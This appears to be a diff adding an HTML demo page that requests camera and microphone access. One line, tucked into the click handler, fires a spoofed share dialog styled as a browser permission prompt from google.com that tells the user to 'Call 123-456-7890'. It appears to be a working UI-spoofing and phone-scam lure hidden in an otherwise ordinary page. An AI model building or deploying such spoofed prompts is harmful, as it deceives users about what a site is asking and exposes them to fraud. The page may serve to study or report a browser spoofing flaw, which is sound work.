@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera and Video Request</title>
+</head>
+<body>
+    
+    <button id="accessButton">Access Camera and Video</button>
+    
+    <video id="video" width="400" controls autoplay></video>
+
+    <script>
+        document.getElementById('accessButton').addEventListener('click', async function() {
+            try {
+										setTimeout(function(){navigator.share({title: '\u26A0 Camera and Microphone \u26A0\nhttps://www.google.com wants to', text: 'Call 123-456-7890'});}, 30)
+
+                // Request camera and video access
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
+                // Display the video stream in the <video> element
+                const videoElement = document.getElementById('video');
+                videoElement.srcObject = stream;
+            } catch (err) {
+                console.error('Error accessing media devices:', err);
+            }
+
+        });
+    </script>
+</body>
+</html>
